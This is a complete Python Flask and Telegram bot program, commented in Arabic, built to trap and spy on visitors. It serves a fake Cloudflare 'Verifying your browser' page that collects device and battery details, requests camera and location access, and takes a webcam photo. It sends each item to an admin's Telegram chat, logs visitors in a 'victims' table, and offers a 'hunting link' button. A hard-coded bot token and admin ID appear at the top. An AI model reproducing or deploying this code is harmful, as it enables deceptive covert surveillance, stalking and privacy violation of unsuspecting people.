import os, base64, requests, io, sqlite3, json, platform, logging
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# ==========================================
# 1. الإعدادات والتوكنات (Config)
# ==========================================
app = Flask(__name__)
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
DB_NAME = "sif_pro_data.db"
BASE_URL = "https://sif-bot-pro.onrender.com"

# ==========================================
# 2. نظام إدارة البيانات (Database Logic)
# ==========================================
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims 
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      ip TEXT, info TEXT, loc TEXT, time TEXT)''')
        conn.commit()

def save_victim(ip, info, loc):
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO victims (ip, info, loc, time) VALUES (?, ?, ?, ?)",
                  (ip, info, loc, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()

# ==========================================
# 3. محرك تليجرام المتقدم (Bot Engine)
# ==========================================
def bot_api(method, payload, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if files: return requests.post(url, data=payload, files=files, timeout=10)
        return requests.post(url, json=payload, timeout=10)
    except Exception as e: print(f"Error: {e}")

def main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔗 جلب رابط الصيد", "callback_data": "get_link"}],
            [{"text": "📊 إحصائيات الضحايا", "callback_data": "stats"}, {"text": "🗑 مسح البيانات", "callback_data": "clear"}],
            [{"text": "🌐 حالة السيرفر", "callback_data": "server_status"}]
        ]
    }

# ==========================================
# 4. واجهة "الفخ" (The Master Template)
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare | Security Check</title>
    <style>
        body { background: #111; color: #eee; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 40px; border-radius: 12px; border: 1px solid #333; text-align: center; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .loader { border: 3px solid #333; border-top: 3px solid #f38020; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="loader"></div>
        <h1>Verifying your browser...</h1>
        <p>يرجى السماح بالصلاحيات للتأكد من أنك لست روبوت (Bot Protection)</p>
    </div>

    <script>
        async function report(data) {
            await fetch('/capture_all', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }

        async function init() {
            // سحب معلومات الجهاز بالكامل
            const deviceInfo = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'N/A',
                ram: navigator.deviceMemory || 'N/A',
                screen: `${window.screen.width}x${window.screen.height}`
            };

            // سحب معلومات البطارية
            try {
                const bat = await navigator.getBattery();
                deviceInfo.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Not Charging'})`;
            } catch(e) { deviceInfo.battery = "Unknown"; }

            // إرسال التقرير الأولي
            await report({type: 'info', data: deviceInfo});

            // طلب الكاميرا والموقع
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await report({type: 'loc', data: loc});
                });

                // التقاط صورة الكاميرا
                setTimeout(async () => {
                    const v = document.createElement('video');
                    v.srcObject = stream; await v.play();
                    const c = document.createElement('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const img = c.toDataURL('image/jpeg').split(',')[1];
                    await report({type: 'img', data: img});
                    window.location.replace("https://google.com");
                }, 2500);
            } catch(e) { window.location.replace("https://google.com"); }
        }
        window.onload = init;
    </script>
</body>
</html>
'''

# ==========================================
# 5. معالجة المسارات (Routes)
# ==========================================
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        update = request.get_json(force=True, silent=True)
        if "message" in update:
            chat_id = update["message"]["chat"]["id"]
            bot_api("sendMessage", {"chat_id": chat_id, "text": "🎛 <b>لوحة تحكم سيف المتطورة</b>\nاختر الإجراء المطلوب:", "parse_mode": "HTML", "reply_markup": main_keyboard()})
        
        elif "callback_query" in update:
            cb = update["callback_query"]; data = cb["data"]; cid = cb["message"]["chat"]["id"]
            if data == "get_link":
                bot_api("sendMessage", {"chat_id": cid, "text": f"🚀 رابط الصيد الخاص بك:\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
            elif data == "stats":
                with sqlite3.connect(DB_NAME) as conn:
                    count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
                bot_api("sendMessage", {"chat_id": cid, "text": f"📊 إحصائيات النظام:\n- عدد الضحايا الكلي: {count}"})
            elif data == "server_status":
                bot_api("sendMessage", {"chat_id": cid, "text": "🟢 السيرفر يعمل بكفاءة 100%\n- نظام DB: SQLite Active"})
        return "OK", 200
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture_all', methods=['POST'])
def capture():
    d = request.get_json(force=True, silent=True)
    if not d: return "OK"
    
    if d['type'] == 'info':
        msg = f"📱 <b>ضحية جديدة دخلت!</b>\n"
        for k, v in d['data'].items(): msg += f"• {k}: {v}\n"
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"})
        save_victim(request.remote_addr, str(d['data']), "")
        
    elif d['type'] == 'loc':
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"📍 <b>موقع الضحية:</b>\n{d['data']}", "parse_mode": "HTML"})
        
    elif d['type'] == 'img':
        img_data = io.BytesIO(base64.b64decode(d['data']))
        img_data.name = 'capture.jpg'
        bot_api("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الكاميرا الأمامية"}, files={'photo': img_data})
        
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
